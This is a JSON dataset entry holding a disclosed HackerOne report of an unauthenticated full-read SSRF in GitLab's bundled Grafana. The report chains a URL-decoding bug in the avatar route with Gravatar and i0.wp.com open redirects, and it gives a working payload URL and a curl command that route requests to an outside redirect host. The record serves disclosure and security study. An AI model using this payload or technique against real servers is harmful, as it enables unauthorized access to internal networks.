@@ -1,0 +1,46 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "rhynorater ",
+  "title": "Full Read SSRF on Gitlab's Internal Grafana",
+  "content": "\nApparently, Grafana is bundled with Gitlab by default. So the grafana instance that is accessible via /-/grafana/is vulnerable to the SSRF outlined below.\nSummary\nBy chaining together some redirects and a URL decoding bug, it is possible to achieve a full-read, unauthenticated, SSRF from your Grafana instance. It is possible to recreate this bug on dev.gitlab.org/-/grafana.\nDetails\nIn the grafana source code, the following route is defined:\nCode 50 Bytes\n1\tr.Get(\"/avatar/:hash\", avatarCacheServer.Handler)\nThis route takes the hash from under /avatar/:hash and routes it to secure.grafana.com in order to access a user's gravatar image. The code that does this looks like this:\nCode 150 Bytes\n1const (\n2\tgravatarSource = \"https://secure.gravatar.com/avatar/\"\n3)\n4...\n5case err = <-thunder.GoFetch(gravatarSource+this.hash+\"?\"+this.reqParams, this):\nThe this.hash referenced in this code is the hash passed in via /avatar/:hash URL Decoded. The fact that this :hash is URL Decoded allows us to smuggle in our own parameters into this request. On secure.gravatar.com, if you supply the d parameter, it allows for redirection to i0.wp.com where some of the images are hosted. This is the first redirect in the redirect chain.\nIn order to get from i0.wp.com to any arbitrary host, quite a lot of investigation into this domain had to be performed. In the end, the open redirect achieved due to some improper redirect validation. The format of urls on i0.wp.com are as follows i0.wp.com/{domainOfImage}/{pathOfImage}. It seems that i0.wp.com wanted to offload some of its image hosting to .bp.blogspot.com whenever possible, so for any host whose domain was *.bp.blogspot.com, i0.wp.com would redirect to that host in order to avoid serving the image. However, after many long hours of investigation, it was discovered that it is possible to turn this into an open redirect using the following form:\nCode 46 Bytes\n1http://i0.wp.com/google.com/1.bp.blogspot.com/\nBy using this trick it is possible to create a redirection chain that goes like this:\nCode 166 Bytes\n1https://secure.gravatar.com/avatar/anything?d=/google.com/1.bp.blogspot.com/\n2->\n3http://i0.wp.com/google.com/1.bp.blogspot.com/\n4->\n5https://google.com/1.bp.blogspot.com\nFinally, using this it is possible to create the SSRF using the following payload:\nCode 127 Bytes\n1https://dev.gitlab.org/-/grafana/avatar/tesata%3fd%3dredirect.rhynorater.com%252f1.bp.blogspot.com%252fYOURHOSTHERE%26cachebust\n(redirect.rhynorater.com is configured to redirect to any host provided after the 1.bp.blogspot.com directory)\nSteps to Reproduce\nRun the following curl command:\nCode 138 Bytes\n1curl \"https://dev.gitlab.org/-/grafana/avatar/test%3fd%3dredirect.rhynorater.com%252f1.bp.blogspot.com%252fpoc.rhynorater.com%26cachebust\"\nRemediation\nIn order to remediate this bug one must either take the Grafana instance inside the internal network or WAF off the /avatar/ endpoint.\nImpact\nFull read, unauthenticated SSRF. This can result in RCE in many environments due to cloud misconfigurations\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": 1000,
+  "weaknesses": [
+    "Server-Side Request Forgery (SSRF)"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1596822480,
+  "report_url": "https://hackerone.com/reports/878779",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Access the Grafana instance at /-/grafana/avatar/:hash with a specially crafted URL"
+    ],
+    [
+      2,
+      "Use URL encoding to inject parameters into the Gravatar request, including a redirect to i0.wp.com"
+    ],
+    [
+      3,
+      "Exploit i0.wp.com's redirect behavior to chain another redirect to an arbitrary host"
+    ],
+    [
+      4,
+      "Final redirect leads to the target internal service, achieving SSRF"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a full-read SSRF in GitLab's internal Grafana instance, achieved by chaining URL decoding bugs and open redirects through Gravatar and i0.wp.com to reach arbitrary internal hosts.",
+  "reason": "This vulnerability involves multiple complex components (URL decoding, Gravatar parameter injection, i0.wp.com redirect behavior analysis) and requires understanding subtle interactions between these components. The attacker must discover and chain non-obvious redirect behaviors across different services.",
+  "new_complexity": "VERY_HIGH",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
